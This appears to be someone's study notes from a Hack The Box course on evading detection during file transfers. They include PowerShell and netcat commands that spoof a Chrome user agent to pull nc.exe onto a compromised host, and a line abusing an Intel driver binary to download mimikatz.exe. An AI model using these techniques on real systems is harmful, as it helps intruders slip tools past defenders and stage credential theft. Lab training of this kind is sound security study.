<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Detection/Evasion</title>
</head><body>Every http/s request has a user agent and can be filtered/detected by IDS/IPS. if we use Powershell / terminal.<br/>
<br/>
User Agents can be changed to "look" normal:<ul><li style="list-style-type: none">List all user agents on Powershell:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">PS C:\htb&gt;[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl</li>
</ul>
</li>
</ul>
Downloading file pretending to be a Chrome User Agent:<ul><li style="list-style-type: none">Set up listener on attacking machine:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">Momothechi@htb[/htb]$ nc -lvnp 80</li>
</ul>
</li>
<li style="list-style-type: none">Setting Chrome User Agent on compromised machine:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">PS C:\htb&gt; $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome</li>
</ul>
</li>
<li style="list-style-type: none">Downloading the file on compromised machine:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">PS C:\htb&gt; Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"</li>
</ul>
</li>
</ul>
<br/>
Appication whitelistening may prevent using Powershell or Netcat aswell as command line logging may allert defenders.<br/>
Using already installed drivers binaries to transfer files. need to check LOLBIN/GTFOBins for binaries that may apply.<br/>
<br/>
f.e.: fxDownloadWrapper.exe - intel driver - contains functionality to download config files periodically <ul><li style="list-style-type: none">PS C:\htb&gt; GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"</li>
</ul>
</body></html>